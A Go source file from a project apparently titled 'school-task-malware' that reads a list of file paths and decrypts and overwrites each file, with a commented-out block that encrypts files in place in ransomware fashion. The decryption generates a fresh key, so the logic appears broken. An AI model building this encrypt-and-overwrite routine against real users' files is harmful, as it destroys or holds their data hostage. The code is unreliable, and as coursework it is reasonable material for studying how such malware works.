package decryption

import (
	"fmt"
	"os"
	"school-task-malware/encryption"
	"school-task-malware/utility"
)

func Start() {
	filePath := "./data/file_paths.txt"
	lines, err := utility.ReadLinesFromFile(filePath)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	key, err := encryption.GenerateEncryptionKey()
	if err != nil {
		panic(err)
	}
	// Print the generated encryption key
	fmt.Println("Generated Encryption Key:", key)

	// Print each line
	for _, line := range lines {
		//if file name file_paths.txt is found, skip it
		if line == "./data/file_paths.txt" {
			continue
		}
		// get file data
		data, err := utility.ReadFile(line)
		if err != nil {
			fmt.Println("Error reading file:", err)
			return
		}
		/* encrypted, err := encryption.Encrypt(data, key)
		if err != nil {
			fmt.Println("Error encrypting data:", err)
			return
		}
		// rewrite the file with encrypted data
		err = os.WriteFile(line, encrypted, 0644)
		if err != nil {
			fmt.Println("Error writing to file:", err)
			return
		} */
		decypted, err := Decrypt(data, key)
		if err != nil {
			fmt.Println("Error decrypting data:", err)
			return
		}
		err = os.WriteFile(line, decypted, 0644)
		if err != nil {
			fmt.Println("Error writing to file:", err)
			return
		}
	}
}
